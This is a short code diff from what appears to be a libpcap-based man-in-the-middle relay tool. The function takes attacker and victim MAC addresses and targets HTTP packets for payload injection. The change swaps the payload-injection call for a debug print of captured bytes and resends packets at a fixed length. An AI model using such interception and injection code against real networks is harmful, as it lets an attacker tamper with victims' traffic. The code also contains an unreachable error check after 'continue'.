@@ -106,10 +106,15 @@ int relay(const char *dev, pcap_t *pcap, u_int8_t *attacker_mac, u_int8_t *victi
                         printf("http!\n");
                         copy_ip(infect_destip, ippkt->ip_dest);
                         fix_len(&((ip_hdr *)(packet + 14))->ip_len, htons(0x0205));
-                        copy_payload(modify, (char *)(packet + 14 + 4 * ippkt->ip_hl + 4 * tcppkt->tcp_offset));
+                        for (int i = 0; i < 30; i++)
+                        {
+                            printf("%c ", (char *)(packet + 14 + 4 * ippkt->ip_hl + 4 * tcppkt->tcp_offset)[i]);
+                        }
+                        printf("\n");
+                        // copy_payload(modify, (char *)(packet + 14 + 4 * ippkt->ip_hl + 4 * tcppkt->tcp_offset));
                     }
                 }
-                int res = pcap_sendpacket(pcap, (u_char *)packet, header->len);
+                int res = pcap_sendpacket(pcap, (u_char *)packet, 0x0205);
                 continue;
                 if (res != 0)
                 {
